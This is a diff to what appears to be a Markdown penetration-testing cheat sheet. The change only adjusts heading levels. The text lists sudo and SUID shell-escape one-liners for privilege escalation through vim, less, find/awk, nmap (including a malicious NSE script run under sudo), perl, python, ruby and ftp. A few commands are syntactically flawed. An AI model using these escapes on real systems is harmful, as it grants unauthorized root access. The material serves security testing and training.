@@ -118,26 +118,26 @@ user@target-machine:~$ cat /etc/hosts
 
 ## SuDo Escape Tests
 Some applications may allow you to run as super-user with `sudo`. If the program has an "escape-back-to-shell" function, it can be leveraged as a priviliege escalation vector. Here is a list of applications which have this feature. Check each one for SUID or `sudo` access from your compromised user. This requires the knownledge of the currently-compromised user account.
-### VI/VIM
+#### VI/VIM
 * :!bash
 * :set shell=/bin/bash:shell
-### Man, More, Less
+#### Man, More, Less
 * !bash
-### Find+AWK
+#### Find+AWK
 * find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
-### AWK
+#### AWK
 awk 'BEGIN {system("/bin/bash")}'
-### NMAP
+#### NMAP
 * nmap --interactive; # then "!sh"
 * echo "os.execute('/bin/sh')" > exploit.nse
 * sudo nmap --script=exploit.nse
-### Perl
+#### Perl
 * perl -e 'exec "/bin/bash";'
-### Python
+#### Python
 * python -c "import pty; pty.spawn("/bin/sh")"
-### Ruby
+#### Ruby
 * ruby exec "/bin/sh"
-### Echo
+#### Echo
 * echo os.system('/bin/bash')
-### FTP
+#### FTP
 * !/bin/sh
